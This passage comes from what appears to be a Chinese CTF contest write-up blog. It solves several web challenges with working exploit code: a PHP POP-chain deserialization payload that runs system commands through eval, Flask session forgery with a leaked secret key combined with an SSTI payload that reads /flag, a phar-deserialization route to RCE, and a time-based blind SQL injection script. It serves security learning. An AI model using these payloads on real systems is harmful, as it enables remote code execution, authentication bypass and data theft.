class="variable">$string</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;string;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">boss</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;boss(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Lion</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tail</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;tail = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;tail;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Monkey</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$head</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hand</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$here</span>=<span class="string">&quot;Zoo&quot;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;head = <span class="variable">$here</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome to &quot;</span>.<span class="keyword">$this</span>-&gt;head.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;head)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Elephant</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nose</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nice</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$nice</span>=<span class="string">&quot;nice&quot;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice = <span class="variable">$nice</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$nice</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;nice-&gt;nose;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;zoo&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize(<span class="variable">$_POST</span>[<span class="string">&#x27;zoo&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> Monkey;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hint in hint.php!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看出这是个<code>pop</code>链漏洞（题目也可以看出！！！）</p><p><a href="https://v0w.top/2020/03/05/unsearise-POP/">pop链的简单学习</a></p><p>学习之后我们找到了这样的一条链子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Money::__wakeup -&gt; Elephant::__toString -&gt; Lion::__get -&gt; Tiger::__invoke</span><br></pre></td></tr></table></figure><p>OK！找到链子后就来生成它吧！</p><p>exp如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tiger</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$string</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$var</span> = <span class="string">&quot;system(&#x27;ls&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Lion</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tail</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;tail = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Monkey</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$head</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hand</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$here</span>=<span class="string">&quot;Zoo&quot;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;head = <span class="variable">$here</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Elephant</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nose</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nice</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$nice</span>=<span class="string">&quot;nice&quot;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice = <span class="variable">$nice</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Elephant;</span><br><span class="line"><span class="variable">$b</span>-&gt;nice = <span class="keyword">new</span> Lion;</span><br><span class="line"><span class="variable">$b</span>-&gt;nice-&gt;tail = <span class="keyword">new</span> Tiger;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Monkey(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>生成的序列化字符串：</p><blockquote><p>O%3A6%3A%22Monkey%22%3A2%3A%7Bs%3A4%3A%22head%22%3BO%3A8%3A%22Elephant%22%3A2%3A%7Bs%3A4%3A%22nose%22%3BN%3Bs%3A4%3A%22nice%22%3BO%3A4%3A%22Lion%22%3A1%3A%7Bs%3A4%3A%22tail%22%3BO%3A5%3A%22Tiger%22%3A2%3A%7Bs%3A6%3A%22string%22%3BN%3Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A11%3A%22system%28%27%27%29%3B%22%3B%7D%7D%7Ds%3A4%3A%22hand%22%3BN%3B%7D</p></blockquote><p>回到 index.php 将以上 payload 使用 post 给 zoo 即可成功利用漏洞</p><p>PS：这里若出现返回状态码为 500 可以用 burp 传值试一试，如果还是不行，应该就是链子的问题了！</p><h2 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h2><p>考点：flask SSTI， flask session伪造</p><p>进入页面</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">try to post &#x27;name&#x27;</span><br></pre></td></tr></table></figure><p>呵呵，你当我不敢？</p><p>直接post一手 name=ggbond</p><p><img src="/post/2021-10/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E8%A5%BF%E5%AE%89%E9%82%AE%E7%94%B5%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/202112062020010.png" alt="image-20211018222709490"></p><p>再测试几次，发现有可控元素，猜测 name 可能存在 SSTI ，继续post</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure><p>发现不行，完了不会了，退了重来！这次我不听它的话了！</p><p>直接 F12 打开 Network 查看响应头，发现</p><p><img src="/post/2021-10/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E8%A5%BF%E5%AE%89%E9%82%AE%E7%94%B5%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/202112062020011.png" alt="image-20211018223109709"></p><ol><li>进入 <code>/source</code> 查看<code>部分</code>源码(也可以通过<code>dirsearch</code>扫描得知)</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">source <span class="keyword">in</span> /source<span class="string">&quot;</span></span><br><span class="line"><span class="string">        return rsp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@app.route(&#x27;/source&#x27;)</span></span><br><span class="line"><span class="string">def source():</span></span><br><span class="line"><span class="string">    f = open(__file__, &#x27;r&#x27;)</span></span><br><span class="line"><span class="string">    rsp = f.read()</span></span><br><span class="line"><span class="string">    f.close()</span></span><br><span class="line"><span class="string">    return rsp[rsp.index(&#x27;source&#x27;):]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@app.route(&#x27;/admin&#x27;)</span></span><br><span class="line"><span class="string">def admin_handler():</span></span><br><span class="line"><span class="string">    try:</span></span><br><span class="line"><span class="string">        role = session.get(&#x27;role&#x27;)</span></span><br><span class="line"><span class="string">        if not isinstance(role, dict):</span></span><br><span class="line"><span class="string">            raise Exception</span></span><br><span class="line"><span class="string">    except Exception:</span></span><br><span class="line"><span class="string">        return &#x27;~~~~~~hacker!&#x27;</span></span><br><span class="line"><span class="string">    if role.get(&#x27;is_admin&#x27;) == 1:</span></span><br><span class="line"><span class="string">        flag = role.get(&#x27;flag&#x27;) or &#x27;admin&#x27;</span></span><br><span class="line"><span class="string">        flag = filter(flag)</span></span><br><span class="line"><span class="string">        message = &quot;</span>%s, I hope you have a good time!your flag <span class="keyword">is</span> <span class="string">&quot; % flag</span></span><br><span class="line"><span class="string">        return render_template_string(message)</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        return &quot;</span>I don<span class="string">&#x27;t know you&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if __name__ == &#x27;</span>__main__<span class="string">&#x27;:</span></span><br><span class="line"><span class="string">    app.run(&#x27;</span><span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span><span class="string">&#x27;, port=80)</span></span><br></pre></td></tr></table></figure><ol start="2"><li>猜测 Cookie 中为 <code>flask session</code></li></ol><blockquote><p>flask session 分为三段，对第一段进行 base64 解密的到：</p><p>{“role”:{“is_admin”:0,”name”:”test”,”secret_key”:”VGgxc0BvbmUhc2VDcmV0IQ==”}}</p></blockquote><p>或者可以使用 <a href="https://github.com/noraj/flask-session-cookie-manager">flask-session-cookie-manager </a>进行解密，用法见项目 <code>README.md</code> 发现密钥为 base64 密文，解密的到密钥：<code>Th1s@one!seCret!</code></p><p>再通过分析代码可知路由 /admin 出可能存在 SSTI 漏洞，但前提是要判定你为 admin 用户，这里就需要伪造用于身份验证的 session ！开始伪造：</p><blockquote><p>payload: {“role”:{“is_admin”:1,”name”:”test”}}</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python&#123;2,3&#125; flask_session_cookie_manager&#123;2,3&#125;.py encode -s <span class="string">&#x27;Th1s@one!seCret!&#x27;</span> -t <span class="string">&#x27;&#123;&quot;role&quot;:&#123;&quot;is_admin&quot;:1,&quot;name&quot;:&quot;test&quot;&#125;&#125;&#x27;</span></span></span><br></pre></td></tr></table></figure><p>通过篡改 Cookie 中的 session 成功进入被认证 admin 身份</p><p>通过源码或这通过回显可知，ssti注入点为 session 中的 flag 键，所以</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:&#123;<span class="attr">&quot;role&quot;</span>:&#123;<span class="attr">&quot;is_admin&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;test&quot;</span>,<span class="attr">&quot;flag&quot;</span>:<span class="string">&quot;&#123;&#123;config.__class__.__init__.__globals__.os.popen(\x27cat /flag\x27).read()&#125;&#125;&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python&#123;2,3&#125; flask_session_cookie_manager&#123;2,3&#125;.py encode -s <span class="string">&#x27;Th1s@one!seCret!&#x27;</span> -t <span class="string">&#x27;&#123;&quot;role&quot;:&#123;&quot;is_admin&quot;:1,&quot;name&quot;:&quot;test&quot;,&quot;flag&quot;:&quot;&#123;&#123;config.__class__.__init__.__globals__.os.popen(\x27cat /flag\x27).read()&#125;&#125;&quot;&#125;&#125;&#x27;</span></span></span><br></pre></td></tr></table></figure><p>在构造<code>payload</code>时需要注意的是不能出现单引号，在伪造 session 的过程中单引号会丢失(这应该与它的加密原理有关），所以咱们可以用<code>十六进制\0x27</code>进行绕过。</p><p>最后篡改Cookie即可获得flag</p><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><p>考点：http 文件上传， phar反序列化漏洞</p><p>进入页面即可看到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>,<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">photoManage</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$action</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;download&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;download();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;upload&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;upload();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">download</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(file_exists(<span class="variable">$filename</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check(<span class="string">&#x27;&#x27;</span>,<span class="variable">$filename</span>)) &#123;</span><br><span class="line">                <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check(<span class="variable">$file</span>,<span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">print</span>(base64_encode(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]));</span><br><span class="line">            move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;/usr/share/nginx/html/uploads/&#x27;</span> . base64_encode(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&#x27;.jpg&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/&lt;\?/&#x27;</span>,<span class="keyword">empty</span>(<span class="variable">$file</span>)?:file_get_contents(<span class="variable">$file</span>)))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;你要是图片我肯定要啊&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/flag|:/&#x27;</span>,<span class="variable">$filename</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;no way&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$con</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$shell</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$shell</span>)&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$shell</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> photoManage();</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p><a href="https://www.yuque.com/u22254338/fht20b/ccdbdv">Phar反序列化漏洞</a></p><p>通过上文的学习写出exp：</p><p>exp.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;1.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot; __HALT_COMPILER();&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> Test();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用 <code>postman</code> 进行文件上传，通过对上面文章 <code>phar 反序列化漏洞</code>的学习后，直接使用 <code>phar://</code> 协议出发<code>反序列化漏洞</code></p><p>从而实现<code>rce</code>，最后在根目录发现flag，进行读取即可！</p><h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><p>考点：sql延时盲注， sql bypass</p><p>因题目还未部署，先贴exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://233e0375.lxctf.net/login.php&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">s</span>):</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        res += <span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[-<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + res + <span class="string">&#x27;25&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> unquote(s.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;%09&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    headers = &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        s = flag</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span>, <span class="number">123</span>):</span><br><span class="line">            pwd = s + <span class="built_in">chr</span>(j)</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;a\\&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;passwd&#x27;</span>: encode(<span class="string">&#x27;||passwd like &#123;&#125; &amp;&amp; sleep(2)#&#x27;</span>.<span class="built_in">format</span>(f(pwd))) <span class="comment"># ||reverse(passwd) like &#123;&#125; &amp;&amp; sleep(2)#</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment"># print(data)</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                res = requests.post(url, data=data, timeout=<span class="number">2</span>, headers=headers)</span><br><span class="line">                <span class="comment"># rint(res.text)</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                flag += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;flag:  &#x27;</span> + flag)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 比赛记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
            <tag> Ctfer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flask框架及其漏洞学习</title>
      <link href="/post/2021-10/Flask%E6%A1%86%E6%9E%B6%E5%8F%8A%E5%85%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
      <url>/post/2021-10/Flask%E6%A1%86%E6%9E%B6%E5%8F%8A%E5%85%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
      
